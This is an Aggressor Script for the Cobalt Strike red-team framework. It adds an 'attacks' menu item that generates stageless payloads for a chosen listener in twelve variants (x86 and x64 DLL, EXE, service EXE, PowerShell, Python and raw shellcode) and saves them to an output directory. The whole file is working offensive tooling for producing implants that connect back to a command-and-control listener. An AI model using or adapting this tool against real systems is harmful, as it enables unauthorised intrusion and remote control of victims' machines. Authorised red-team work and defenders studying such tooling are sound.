# 
# This script generates stageless payload variants per each available architecture and output
# format type. Compatible with Cobalt Strike 4.0+
#
# Author: Mariusz B. / mgeeky, '20
# <mb [at] binary-offensive.com>
#

sub write_payload
{
  local('$outpath');
  local('$filename');
  local('$data');

  $outpath = $1;
  $filename = $2;
  $data = $3;

  local('$path');
  $path = getFileProper($outpath, $filename);

  local('$handle');
  $handle = openf(">$path");
  writeb($handle, $data);
  closef($handle);

  #println("Written file to $path ");
}

sub generate 
{
  local('%options');
  %options = $3;

  write_payload(%options["outpath"], %options["listener"] . "-x86.dll", artifact_payload(%options["listener"], "dll", "x86"));
  write_payload(%options["outpath"], %options["listener"] . "-x64.dll", artifact_payload(%options["listener"], "dllx64", "x64"));
  write_payload(%options["outpath"], %options["listener"] . "-x86.exe", artifact_payload(%options["listener"], "exe", "x86"));
  write_payload(%options["outpath"], %options["listener"] . "-x64.exe", artifact_payload(%options["listener"], "exe", "x64"));
  write_payload(%options["outpath"], %options["listener"] . "-x86.ps1", artifact_payload(%options["listener"], "powershell", "x86"));
  write_payload(%options["outpath"], %options["listener"] . "-x64.ps1", artifact_payload(%options["listener"], "powershell", "x64"));
  write_payload(%options["outpath"], %options["listener"] . "-x86.py", artifact_payload(%options["listener"], "python", "x86"));
  write_payload(%options["outpath"], %options["listener"] . "-x64.py", artifact_payload(%options["listener"], "python", "x64"));
  write_payload(%options["outpath"], %options["listener"] . "-x86.bin", artifact_payload(%options["listener"], "raw", "x86"));
  write_payload(%options["outpath"], %options["listener"] . "-x64.bin", artifact_payload(%options["listener"], "raw", "x64"));
  write_payload(%options["outpath"], %options["listener"] . "-svc-x86.exe", artifact_payload(%options["listener"], "svcexe", "x86"));
  write_payload(%options["outpath"], %options["listener"] . "-svc-x64.exe", artifact_payload(%options["listener"], "svcexe", "x64"));

  show_message("Generated payloads saved to: " . %options["outpath"]);
}

popup attacks 
{
  item "Generate payload variants" 
  {
    local('$dialog %defaults');

    $dialog = dialog("Generate payload variants", %defaults, &generate);
    
    dialog_description($dialog, "Generates variants for the selected listener's payloads and dumps them to specified output directory.");
    drow_listener_stage($dialog, "listener", "Listener: ");
    drow_text($dialog, "outpath", "Output directory:");
    dbutton_action($dialog, "Generate");

    dialog_show($dialog);
  }
}